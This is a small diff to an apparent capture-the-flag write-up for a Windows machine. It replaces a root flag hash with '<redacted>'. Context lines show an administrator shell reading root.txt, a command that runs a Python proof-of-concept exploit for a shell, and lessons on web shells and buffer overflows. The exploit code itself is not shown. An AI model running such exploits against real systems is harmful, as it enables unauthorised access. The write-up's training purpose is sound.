@@ -180,7 +180,7 @@ Microsoft Windows [Version 10.0.17134.1610]
 C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
 
 type C:\Users\Administrator\Desktop\root.txt
-ba8420b682467266b8283f5a4f34036f
+<redacted>
 
 # running the POC, note the POC might take sometime before giving the shell
 $: python2 PoC_exploit_Win10_x64.py
@@ -190,4 +190,3 @@ $: python2 PoC_exploit_Win10_x64.py
 #### Lesson Learned
 - web shell workings
 - buffer overflow practice
-
